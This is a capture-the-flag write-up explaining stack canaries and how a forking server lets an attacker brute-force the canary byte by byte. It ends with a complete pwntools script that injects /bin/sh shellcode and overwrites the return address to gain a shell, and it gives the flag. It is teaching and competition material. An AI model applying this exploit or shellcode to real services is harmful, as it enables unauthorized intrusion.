# cookies-with-a-fork

## by *kaipan*

### Challenge Premise

This challenge deals with stack cookies or stack canaries.

We’ll start by understanding what a stack cookie/canary is and what it protects. In general, a stack cookie is a randomly chosen value (4 or 8  bytes long for 32-bit and 64-bit systems respectively) which is always put before the saved base pointer on the stack. Before a function returns the stack cookie will always be checked for correctness. If it is modified a program will just crash (*stack smashed* seems to be the term for detection of a modified stack and potential overflow from the cookie/canary changing) and a possible malicious code won’t be executed. This gives us a certain amount of security if a stack buffer overflow occurs because it protects us against control over the return address of the program (if the cookie is before the saved base pointer, then it must be before the return address, so if the cookie is modified then it means that the return address could also have been modified after the stack cookie, but if it is untampered, then we can be sure in **the ideal case** that anything after the cookie, including the return address, is also untampered). But there are multiple problems with stack cookies.

The first problem is that we can still overflow all variables which are between our buffer and the stack cookie. Second, if the program forks it is possible to leak the stack cookie because it has the same value in each child process (an example being a server process forking to serve clients, but the stack cookie remains the same for all forks). Third problem, if the target does not have a classic buffer overflow e.g. a format string vulnerability or a relative write out of bounds via an array, we could still bypass the stack cookie and write directly to certain addresses. So, stack cookies are somewhat good protection against non-forked programs with stack buffer overflow vulnerabilities but for other scenarios, this protection is  easy to bypass. Stack cookies only make it harder for adversaries to hack the binary, but they aren't guaranteed protection like **base and bounds** checking, but base and bounds checking is often computationally expensive, whereas cookies barely affect performance.

Note that stack cookies always have a null byte as the least significant byte because some functions will stop reading data if a null byte is sent. Therefore, an attacker would not be able to brute force or even send a stack cookie, if it is known, because the function would stop reading at the null byte.

### Exploit

All we need to know is that the stack cookie remains the same every time you fork, so by forking you basically can just brute force and guess the stack cookie byte by byte, the number 10 when converted with `p8` results in a newline and so we have to skip over it, which is pretty dumb (so pray that the number 10 is not part of the cookie lmao or just rerun until you get a clean stack cookie) since it will end the child function and result in an incorrect guess, and the last byte of the stack cookie is always *0x00* so we only have to guess the other 7 bytes (architecture is 64 bit, so cookie is 8 bytes total). We can tell when we guess a byte correctly since the child should exit normally since the cookie was not modified, otherwise you get a stack smash message and you need to continue guessing.

There is no print flag function, so we need to get a reverse shell by using shellcode. The child process runs a function that gets user input and stores it in a buffer, but of course, the binary reads in more data then there is space in the buffer, so there is a buffer overflow exploit that we can use to run our shellcode (NX flag is disabled, so code can be executed on the stack). We need to load our shellcode in the buffer, and then overwrite the return address to return to the address of our shellcode (which the binary convenient provides for us by printing the address so we just need to parse the address of the buffer to run the shellcode), making sure the write past the cookie without modifying it on the way and the saved RBP as well.

Each byte can have a value from 0 to 255, so we just setup a loop to iterate through each byte, and an inner loop to guess each possible byte value. We need to find how many bytes we need to write to reach the stack cookie from the buffer, which we can do trial and error for (keep on writing more and more bytes and keep track of the number until you stack smash) or use the disassembly of the `child` function in **pwndbg** to find the offset from RBP (I used this method, and the offset was 208, since the cookie is 8 bytes below, it means we write 200 bytes to reach the cookie, then 8 more bytes to reach RBP, then 8 bytes to overwrite the return address). We build our initial payload with the shellcode, filler to reach the stack cookie, the last 0x00 byte of the stack cookie, then we use our loop to guess the remaining 7 bytes and add it to our payload. After that is done, we have our final payload and we send it to the binary which should execute the shellcode and then give us a reverse shell, which allows us to `cat flag` and get the flag!

### Script

```python
#!/usr/bin/env python3
from pwn import *

p = remote("chal.ctf-league.osusec.org", 1555)

shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

# payload = shellcode + 'A' * (200-27) + cookie + RBP + ret addr
payload = shellcode + b'A' * (200-27) + p8(0x00)

print(p.recvline().strip())
location_str = ""

# Guess the bytes
for bruh in range(7):

    print("Current payload: " + str(payload))
    print("Guessing byte #" + str(bruh + 2))

    for i in range(256):

        if i == 10:
            continue

        test = payload + p8(i)

        # Please give me some data receive
        location_str = p.recvline().strip()
        print(location_str)

        p.sendline(test)

        # Read exit status
        exit_str = p.recvline().strip()
        print(exit_str)

        # Check for stack smash or exit status (valid)
        # Valid, break and then guess the next byte using outer for loop
        if b'exit status' in exit_str:
            payload += p8(i)
            print("Correct guess: %d" % i)
            break

# Reach RBP, so now we just overwrite that and the ret addr to run shellcode
# Parse location string for the location
location = int(location_str.split()[-1][:-1], 16)
payload += p64(location) * 3

p.sendline(payload)

p.interactive()
```

### Flag

`osu{br34k_4LL_t53_def3n5es!!!}`